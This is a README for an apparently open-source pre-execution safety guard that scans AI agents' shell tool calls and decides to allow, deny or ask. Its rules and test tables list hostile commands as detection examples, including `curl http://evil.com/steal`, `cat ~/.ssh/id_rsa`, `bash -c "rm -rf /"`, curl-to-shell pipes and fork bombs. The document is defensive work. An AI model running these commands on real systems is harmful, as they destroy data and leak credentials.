# Tool Execution Safety Guard

A configurable pre-execution safety scanner for Agent tool calls in
tRPC-Agent-Go. It inspects shell commands before they execute and
returns `allow` / `deny` / `ask` decisions with structured reports and
audit trails.

## Quick Start

```bash
cd examples/tool_safety_guard
go run . -policy=tool_safety_policy.yaml
```

## Architecture

```
Model calls tool
      │
      ▼
functioncall.go
      │
      ├─ checkToolPermission()          ← intercept point (existing)
      │     │
      │     ├─ tool.PermissionChecker   ← SafetyGuard plugs in here
      │     └─ tool.PermissionPolicy    ← SafetyGuard can also plug here
      │
      ├─ shellsafe.Parse(command)       ← structural validation
      │     ├─ reject $(), backticks, redirections, subshells
      │     └─ reject shell wrappers (sh, bash, eval, sudo, ...)
      │
      ├─ SafetyGuard.Scanner.Scan()     ← content-level rules (NEW)
      │     ├─ R1: dangerous commands (rm -rf, mkfs, chmod 777)
      │     ├─ R2: network (non-whitelist domains, blocked tools)
      │     ├─ R3: shell bypass (base64 pipes, hex encoding)
      │     ├─ R4: host risks (sudo, background, PTY sessions)
      │     ├─ R5: dependency install (pip, npm, apt, curl|bash)
      │     ├─ R6: resource abuse (sleep, fork bomb, huge output)
      │     └─ R7: sensitive leaks (API keys, tokens, passwords)
      │
      └─ Decision: allow / deny / ask
              │
              ├─ deny  → skip executeTool, return denial to model
              └─ ask   → skip executeTool, return approval request to model
```

## Integration Points

### As a PermissionPolicy (runner-level, covers all tools)

```go
guard, _ := safety.NewSafetyGuard(
    safety.WithPolicyFile("tool_safety_policy.yaml"),
    safety.WithAuditFile("tool_safety_audit.jsonl"),
)
defer guard.Close()

events, _ := runner.Run(ctx, userID, sessionID, msg,
    agent.WithToolPermissionPolicy(guard.AsPermissionPolicy()),
)
```

### As a PermissionChecker (per-tool wrapper)

```go
safeTool := guard.WrapTool(originalExecTool)
```

## Policy File

The policy file (`tool_safety_policy.yaml`) is the single source of
truth. Changes take effect on the next scan without recompilation.

Key sections:

| Section | Controls |
|---------|----------|
| `denied_commands` | Commands always blocked (rm, mkfs, dd, ...) |
| `allowed_commands` | Optional whitelist of permitted command names |
| `denied_path_patterns` | Regex for sensitive paths (~/.ssh, /etc/shadow, .env) |
| `allowed_domains` | Network domain whitelist |
| `blocked_network_tools` | Tools barred from network access (curl, wget, nc, ssh) |
| `max_timeout_sec` | Maximum allowed timeout |
| `max_output_bytes` | Maximum output size |
| `auto_deny_risk_levels` | Risk levels that trigger automatic deny |
| `sensitive_patterns` | Regex for secret detection (AWS keys, tokens, JWT) |
| `backend_overrides` | Per-backend policy adjustments (hostexec stricter) |

## Risk Rules Reference

| Rule ID | Category | Risk | What it detects |
|---------|----------|------|-----------------|
| R1-DANGEROUS-DELETE | dangerous_cmd | critical | `rm -rf`, `killall`, `shutdown` |
| R1-DANGEROUS-OVERWRITE | dangerous_cmd | critical | `mkfs`, `dd of=/dev/`, `> /dev/sda` |
| R1-SENSITIVE-PATH | dangerous_cmd | high | SSH keys, AWS creds, /etc/shadow, .env files |
| R1-DENIED-COMMAND | dangerous_cmd | high | Command on policy's denied_commands list |
| R1-ALLOWED-COMMAND | dangerous_cmd | high | Command not in allowed_commands list |
| R2-BLOCKED-NETWORK-TOOL | network | high | curl, wget, nc, ssh, telnet usage |
| R2-NON-WHITELIST-DOMAIN | network | high | URL target not in allowed_domains |
| R3-SHELL-REEXEC | shell_bypass | critical | sh -c, bash -c, eval, exec, source |
| R3-SHELL-WRAPPER | shell_bypass | high | env, xargs, timeout, nohup, sudo, su |
| R3-BASE64-BYPASS | shell_bypass | high | base64 -d pipelines that decode+execute |
| R3-HEX-BYPASS | shell_bypass | medium | hex-encoded payloads, xxd decode |
| R4-HOST-PRIVILEGE-ESCALATION | host_risk | critical | sudo, su, doas, systemctl stop |
| R4-HOST-BACKGROUND-PROCESS | host_risk | high | nohup, disown, background (&) in hostexec |
| R4-HOST-PTY-LONG-SESSION | host_risk | medium | PTY + no timeout or background in hostexec |
| R5-DEPENDENCY-INSTALL | dependency | high | pip/npm/go/apt/cargo/brew install |
| R5-CURL-PIPE-BASH | dependency | critical | curl piped to shell (curl ⎮ sh) |
| R5-ENV-MODIFICATION | dependency | medium | `export VAR=value` |
| R6-EXCESSIVE-TIMEOUT | resource | high | Timeout exceeds configured max |
| R6-LONG-SLEEP | resource | high | sleep longer than 60 seconds |
| R6-FORK-BOMB | resource | critical | Fork bomb patterns |
| R6-EXCESSIVE-OUTPUT | resource | medium | `find /`, `/dev/zero` reads |
| R7-SENSITIVE-OUTPUT | sensitive | high | AWS keys, GitHub tokens, JWT, passwords in output |

## Safety Boundaries by Backend

| Dimension | workspaceexec (with policy) | hostexec (with SafetyGuard) |
|-----------|---------------------------|---------------------------|
| Command structure | shellsafe parse + rules | shellsafe parse + rules |
| Shell bypass | implicit deny + R3 rules | R3 rules |
| Environment | envscrub + CleanEnv=true | env key allowlist only |
| Filesystem | Workspace isolated directory | Bare-metal filesystem |
| Network | Runtime-dependent caps | Domain whitelist |
| Process lifecycle | Engine-managed | PTY + manual SIGKILL |
| Output limits | Engine timeout + truncation | Timeout + max output config |
| Recommendation | Preferred for automated exec | Use only when workspace isolation isn't feasible |

## Why SafetyGuard Cannot Replace Sandbox Isolation

SafetyGuard is a **pre-execution gate**, not a **runtime isolation**
mechanism. They address different threat vectors and are complementary:

| Concern | SafetyGuard | OS Sandbox (bubblewrap/Seatbelt) |
|---------|-------------|----------------------------------|
| **Layer** | Static analysis before execution | Kernel-level enforcement during execution |
| **Defense** | Pattern matching against known risks | Namespace + cgroup isolation for all behavior |
| **Bypass** | Obfuscation, encoding, indirect execution | Extremely difficult (kernel-enforced) |
| **Resource limits** | Config-based timeout/output checks | cgroups: hard CPU/memory/disk caps |
| **Filesystem** | Path pattern matching | OverlayFS, tmpfs, read-only mounts |
| **Network** | Domain whitelist (DNS-level) | Network namespace, seccomp filters |
| **Zero-day** | Cannot defend against unknown exploits | Process isolation limits blast radius |
| **Runtime behavior** | Cannot inspect runtime behavior | Seccomp/AppArmor restrict syscalls |

**SafetyGuard is the door guard — it checks credentials and denies
entry to known threats. The sandbox is the prison walls — even if a
threat slips past the guard, it cannot escape the cell.**

For production deployments, use both:
1. SafetyGuard to detect and block known-dangerous commands before
   they reach the executor.
2. `codeexecutor/sandbox` (bubblewrap on Linux, Seatbelt on macOS) to
   isolate the execution environment.

## Relationship to Existing Components

### shellsafe (`internal/shellsafe`)

shellsafe validates command **structure** (rejecting `$()`, backticks,
redirections) and enforces command-**name** allow/deny lists.
SafetyGuard sits on top, calling `shellsafe.Parse()` as a prerequisite,
then adding **parameter-content** inspection that shellsafe does not
cover (what URLs is curl hitting? what paths is cat reading?).

### PermissionPolicy (`tool/permission.go`)

The framework's `tool.PermissionPolicy` interface is the interception
point in `functioncall.go` that runs before `executeTool()`. SafetyGuard
implements `tool.PermissionChecker` (and can be adapted to
`tool.PermissionPolicyFunc`) to plug into this point **without any
framework code changes**.

### Filter (`tool/filter.go`)

Filter controls tool **visibility** (which tools the model can see).
SafetyGuard controls tool **execution** (whether a visible tool's call
actually runs). They are orthogonal: Filter hides tools from the model;
SafetyGuard intercepts calls to visible tools.

### workspaceexec (`tool/workspaceexec`)

workspaceexec already integrates shellsafe for command-name policy
and envscrub for environment hardening. SafetyGuard adds content-level
scanning on top, running **before** workspaceexec's `prepareExec()` via
the PermissionChecker interface.

### hostexec (`tool/hostexec`)

hostexec currently has **no** safety integration — no shellsafe, no
envscrub, no policy. SafetyGuard is its first line of defense. When
attached as a PermissionPolicy, hostexec commands are scanned for all
seven risk categories before reaching the bare-metal shell.

### codeexecutor (`codeexecutor/`)

codeexecutor provides the execution runtime (local, container, E2B,
sandbox). SafetyGuard inspects commands before they reach
codeexecutor. The `sandbox` backend within codeexecutor provides OS-level
isolation, which is complementary to SafetyGuard's pre-execution checks.

### Telemetry (OpenTelemetry)

When OTEL tracing is active, SafetyGuard injects span attributes:
`tool.safety.decision`, `tool.safety.risk_level`,
`tool.safety.rule_id`, `tool.safety.backend`, `tool.safety.tool_name`,
and `tool.safety.intercepted`. These flow into existing tracing
pipelines (Jaeger, Langfuse, etc.) without additional setup.

## Audit Format

Audit events are written in JSONL format. Each line is a self-contained
JSON object:

```json
{
  "timestamp": "2026-01-15T10:30:00Z",
  "tool_name": "workspace_exec",
  "backend": "workspaceexec",
  "command": "rm -rf /important/data",
  "decision": "deny",
  "risk_level": "critical",
  "rule_ids": ["R1-DANGEROUS-DELETE"],
  "intercepted": true,
  "duration_ms": 0,
  "sanitized": false
}
```

Fields:
- `tool_name` — the tool that was about to execute
- `decision` — allow / deny / ask
- `risk_level` — critical / high / medium / low / none
- `rule_ids` — list of rule IDs that triggered
- `intercepted` — whether execution was blocked
- `duration_ms` — scan duration in milliseconds
- `sanitized` — whether sensitive data was redacted from the audit entry

## Test Cases

The test suite (`test_cases_test.go`) covers 12 scenarios:

| # | Command | Expected | Rule |
|---|---------|----------|------|
| 1 | `go test ./...` | allow | — |
| 2 | `rm -rf /important/data` | deny | R1-DANGEROUS-DELETE |
| 3 | `cat ~/.ssh/id_rsa` | deny | R1-SENSITIVE-PATH |
| 4 | `curl http://evil.com/steal` | deny | R2-NON-WHITELIST-DOMAIN |
| 5 | `curl https://api.github.com/repos` | deny* | R2-BLOCKED-NETWORK-TOOL |
| 6 | `bash -c "rm -rf /"` | deny | R3-SHELL-REEXEC |
| 7 | `ls \| grep secret \| xargs cat` | deny | R3-SHELL-WRAPPER |
| 8 | `pip install malicious-package` | deny | R5-DEPENDENCY-INSTALL |
| 9 | `sleep 3600` | deny | R6-LONG-SLEEP |
| 10 | `find / -name "*.log"` | deny | R6-EXCESSIVE-OUTPUT |
| 11 | `sudo systemctl stop firewall` | deny | R4-HOST-PRIVILEGE-ESCALATION |
| 12 | `git clone https://untrusted.com/repo.git` | ask | R2-NON-WHITELIST-DOMAIN |

\* curl is on blocked_network_tools; allowed_domains only applies to
non-blocked tools.
